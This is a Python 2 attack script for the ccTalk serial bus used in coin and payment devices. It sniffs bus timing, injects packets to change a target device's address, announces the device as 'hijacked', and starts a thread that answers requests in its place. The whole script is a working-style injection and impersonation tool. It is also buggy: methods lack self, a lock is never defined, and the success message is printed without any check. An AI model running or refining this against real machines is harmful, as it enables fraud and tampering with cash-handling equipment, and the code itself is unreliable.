#!/usr/bin/env python
# -*- coding: utf-8 -*-

import serial
import threading
import time
import sys
from optparse import OptionParser

from ccTalk import *

class ccResponder(threading.Thread):
    """
    This class sets a thread that listens for incoming packets and responds to them
    """

    def __init__(self, address):
        super(ccResponder, self).__init__()
        self.terminated = False
        self.address = address
        self.responses={}

    def readPacket():
        """
        Reads a ccTalk packet and returns it
        """
        while true:
            #Read the destination address
            dst = ser.read(1)
            length = ser.read(1)
            while ser.inWaiting()<length+3:
                time.sleep(0.001)
            pkt = dst+length+ser.read(length+3)
            ccPkt = ccTalkMessage(pkt)
            return ccPkt

    def setResponse(header,response):
        """
        Changes the data to sent in response to a request
        """
        self.responses.update({header,response})

    def respond(request):
        """
        Responds to a request
        """
        resp = ccTalkMessage(header=0, source=self.address, destination=request.source, data=self.responses[request.header])
        ser.write(chr(0b00010000+(len(resp)-1)))
        ser.write(resp)
        #Clear the packet we sent, since it's a 1 wire bus
        ser.read(len(resp))
    
    def run(self):
        global ser
        global readLock
        while not self.terminated:
            pkt = self.readPacket()
            if pkt.destination==self.address:
                #The packet is for the responder
                respond(pkt)
                print "Responded to request " + str(request.payload.header)

    def stop(self):
        self.terminated = True

class serialTimerReader(threading.Thread):
    """
    This class defines a thread that grabs data on a ccTalk bus as well as the blank
    times to determine if injection is possible
    """

    def __init__(self):
        super(serialTimerReader, self).__init__()
        self.terminated = False
        self.data=""
        self.times=[]
    
    def run(self):
        #print "serialTimerReader running"
        global ser
        bytesToRead=0
        while not self.terminated:
            start = time.clock()
            while ser.inWaiting() == 0:
                time.sleep(0.001)
            elapsed = round(time.clock()-start,3)
            # We need at least a 10 miliseconds time frame to start sending
            # We'll take at least 20 miliseconds to wait and send our data 
            if elapsed > 0.02:
                self.times.append(elapsed)
            data = ser.read(ser.inWaiting())

    def stop(self):
        self.terminated = True

    def getData(self):
        return self.data

    def getTimes(self):
        return self.times

            

def enterBitBang():

    # Enter bitbang mode
    for i in xrange(20):
        ser.write("\x00")
        if ser.inWaiting()>4:
            if "BBIO1" in ser.read(5):
                break

    # Enter UART mode
    ser.write("\x03")

    #Baud rate : 9600
    ser.write(chr(0b01100100))

    #Peripherals : power ON / pullup ON
    ser.write(chr(0b01001100))


    # Enable UART RX echo
    ser.write(chr(0b00000010))

    # Cleans input buffer
    ser.flushInput()


def leaveBitBang():

    # Disable UART RX echo
    ser.write(chr(0b00000011))


    # Leave UART mode
    ser.write("\x00")

    # Leave bitbang mode
    ser.write("\x0f")

def injectMessage(header, data='', source=1, destination=2):
    """
    Waits for a silence on the ccTalk bus, the sends a packet"
    """
    request = ccTalkMessage(source=source, destination=destination, header=header, payload=data)
    #request.setPayload(header, data)
    bytesToRead=0
    sent=False
    readLock.acquire()
    while not sent:
        start = time.clock()
        while bytesToRead == 0 and not sent:
            bytesToRead = ser.inWaiting()
            if time.clock()-start >= 0.01:
                ser.write(chr(0b00010000+(len(request)-1)))
                ser.write(request)
                sent=True
                break
        ser.flushInput()
        bytesToRead=0
    print "[*] Request sent"
    readLock.release()


if __name__ == '__main__':

    parser = OptionParser()
    parser.add_option("-i", "--interface", help="Serial port to use", metavar="DEVICE", dest="serPort")
    parser.add_option("-w", "--write", help="File name to write data", metavar="FILE", dest="outFile")
    parser.add_option("-b", "--bus-pirate", help="Use this switch to tell the serial port is a bus pirate", dest="busPirate", action="store_true", default=False)
    parser.add_option("-s", "--source", help="Source address of the device to hijack", metavar="SOURCE", dest="source", default=2)
    parser.add_option("-d", "--destination", help="Destination address of the device to hijack", metavar="DESTINATION", dest="destination", default=42)

    (options, args) = parser.parse_args()

    if options.serPort is None:
        print "Error, no serial port specified"
        sys.exit()
    else:
        try:
            if options.busPirate:
                ser=serial.Serial(options.serPort, 115200, timeout=1)
            else:
                ser=serial.Serial(options.serPort, 9600, timeout=1)
        except serial.SerialException, e:
            print e.message
            sys.exit()

    if options.outFile is not None:
        outFile = open(options.outFile,"wb")
    else:
        outFile = None

    # Inits the bus pirate device if needed
    if options.busPirate:
        enterBitBang()

    # main loop
    try:
        reader = serialTimerReader()
        reader.start()
        print "[*]Serial timer reader running for 5 seconds..."

        time.sleep(5)
        print "[*]Stopping timer reader..."

        reader.stop()
        reader.join()

        times = reader.getTimes()

        if len(times)>0:
            print "[*] Time slots found, ready for injection"

            
            print "[*] Replacing device @ "+str(options.source)+" to "+str(options.destination)

            time.sleep(1)

            # Check if there is a device on the destination address
            injectMessage( header=254, data='', source=1, destination=int(options.destination))
            #TODO: Add check for device response

            time.sleep(5)

            # Send an address change request to the device
            injectMessage( header=251, data=chr(int(options.destination)), source=1, destination=int(options.source))

            time.sleep(5)

            # Check if the device address is correctly changed
            injectMessage( header=254, data='', source=1, destination=int(options.destination))

            time.sleep(5)

            #TODO: Add check for correct device hijack

            print "[*] Device successfully hijacked"

                    
            responder = ccResponder(options.destination)
            responder.start()

            time.sleep(5)


    except Exception, e:
        print e
        if options.busPirate:
            leaveBitBang()

        reader.stop()
        reader.join()

